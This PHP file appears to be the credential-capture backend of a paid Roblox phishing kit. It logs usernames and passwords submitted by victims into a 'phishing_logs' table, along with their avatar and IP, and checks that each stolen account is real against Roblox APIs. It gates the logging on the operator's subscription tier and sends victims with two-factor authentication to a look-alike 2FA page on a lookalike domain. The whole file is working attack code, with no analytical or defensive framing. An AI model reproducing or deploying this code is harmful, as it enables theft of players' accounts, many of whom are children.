<?php
    if(isset($_POST['username']) && isset($_POST['password'])){

        $username = htmlspecialchars($_POST['username']);
        $pw = htmlspecialchars($_POST['password']);
        if(checkID(htmlspecialchars($userid)) == 1){

            $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($userid)])->fetchColumn();
            $subscription = pdoQuery($db, "SELECT `subscription` FROM `users` WHERE `id`=?", [htmlspecialchars($userid)])->fetchColumn();
            $subEndDate = pdoQuery($db, "SELECT `subEndDate` FROM `users` WHERE `id`=?", [htmlspecialchars($userid)])->fetchColumn();
            $id = getID(50);

            if($banned == 0){

                if($subscription == "Monthly" || $subscription == "3Months" || $subscription == "Lifetime"){

                    $date = new DateTime($subEndDate);
                    $now = new DateTime();
                    if($date > $now) {
                        $PDOADD = $db -> prepare('INSERT INTO `phishing_logs` VALUES(:ID, :avatar ,:username, :pw, :realacc, :type, :pin, :ip, :botID, :date)');
                        $PDOADD -> execute(array(':ID' => htmlspecialchars($userid), ':avatar' => avatarfromID(),':username' => $username, ':pw' => $pw, ':realacc' => checkUser(), ':type' => 'Phishing Log', ':pin' => 'N/A', ':ip' => encrypt(realIP()), ':botID' => $id, ':date' => date("Y-m-d H:i:s")));
                        
                        if($twofa == "true"){
                            $_SESSION['username'] = $username;
                            $_SESSION['password'] = $pw;
                            $_SESSION['id'] = htmlspecialchars($userid);
                            header("location: https://rblx-api.com/2FA");
                            exit();
                        }else{
                            header("location: $redirect");
                            exit();
                        }
                    }else{
                        //sub expired
                        $PDOUpdate = $db -> prepare('UPDATE `users` SET `subEndDate` = :sub WHERE `id` = :id');
                        $PDOUpdate -> execute(array(':sub' => '0', ':id' => htmlspecialchars($userid)));
            
                        $PDOUpdate1 = $db -> prepare('UPDATE `users` SET `subscription` = :sub WHERE `id` = :id');
                        $PDOUpdate1 -> execute(array(':sub' => 'None', ':id' => htmlspecialchars($userid)));
            
                        $PDOUpdate2 = $db -> prepare('UPDATE `users` SET `rank` = :rank WHERE `id` = :id');
                        $PDOUpdate2 -> execute(array(':rank' => 'User', ':id' => htmlspecialchars($userid)));
                    }
                }
            }
        }
    }

    function checkUser(){
        global $username;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.roblox.com/users/get-by-username?username=$username");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        curl_close($ch);
        if(strpos($output, "Id")){
            return "true";
        }else{
            return "false";
        }
    }
    function getnameID(){
        global $username;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.roblox.com/users/get-by-username?username=$username");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        curl_close($ch);
        if(strpos($output, "Id")){
            $data = json_decode($output, 1);
            return $data["Id"];
        }
    }
    function avatarfromID(){
        $id = htmlspecialchars(getnameID());
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://thumbnails.roblox.com/v1/users/avatar?userIds=$id&size=720x720&format=Png&isCircular=false&_=1598491497171");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        curl_close($ch);
        if(strpos($output, "imageUrl")){
            $obj = json_decode($output);
            
            return htmlspecialchars($obj->data[0]->imageUrl); 
        }
    }
    function checkID($id){
        global $db;
        $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
		$PDOCheckID = $db -> prepare("SELECT COUNT(*) FROM `users` WHERE `id` = :id");
		$PDOCheckID -> execute(array(':id' => $id));
        $countID = $PDOCheckID -> fetchColumn(0);
        return $countID;
    }
    function realIP() {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
        elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; }
        else { $ip = $remote; }
    
        return $ip;
    }
    function getID($length){
        $token = "";
        $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
        $codeAlphabet.= "0123456789";
        $max = strlen($codeAlphabet);
   
       for ($i=0; $i < $length; $i++) {
           $token .= $codeAlphabet[random_int(0, $max-1)];
       }
   
       return $token;
    }
    function encrypt($message)
    {
        if (OPENSSL_VERSION_NUMBER <= 268443727) {
            throw new RuntimeException('OpenSSL Version too old, vulnerability to Heartbleed');
        }
        
        $iv_size        = openssl_cipher_iv_length('aes-256-cbc');
        $iv             = openssl_random_pseudo_bytes($iv_size);
        $ciphertext     = openssl_encrypt($message, 'aes-256-cbc', "Z8ZW4nRUDC8wbBDqYSG5rJY8Advtar7X", OPENSSL_RAW_DATA, $iv);
        $ciphertext_hex = bin2hex($ciphertext);
        $iv_hex         = bin2hex($iv);
        return "$iv_hex:$ciphertext_hex";
    }
    function decrypt($ciphered) {
        $iv_size    = openssl_cipher_iv_length('aes-256-cbc');
        $data       = explode(":", $ciphered);
        $iv         = hex2bin($data[0]);
        $ciphertext = hex2bin($data[1]);
        return openssl_decrypt($ciphertext, 'aes-256-cbc', "Z8ZW4nRUDC8wbBDqYSG5rJY8Advtar7X", OPENSSL_RAW_DATA, $iv);
    }
    function pdoQuery($con, $query, $values = array()) {
        if($values) {
            $stmt = $con->prepare($query);
            $stmt->execute($values);
        } else {
            $stmt = $con->query($query);
        }
        return $stmt;
    }
?>